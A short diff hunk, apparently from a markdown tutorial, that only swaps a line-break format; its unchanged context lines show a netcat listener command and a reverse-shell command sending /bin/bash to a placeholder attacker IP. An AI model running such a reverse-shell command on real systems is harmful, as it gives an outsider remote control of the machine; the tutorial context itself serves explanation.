@@ -11,8 +11,7 @@
 
     * **Attacker's Machine**: `nc -lvnp 4444` (sets up a listener on port 4444)
     *   **Target Machine**: `nc [attacker_ip] 4444 -e /bin/bash` (connects back to the attacker's machine, providing a shell)\
-        \
-
+        <br>
 
         Here’s what happens:
 
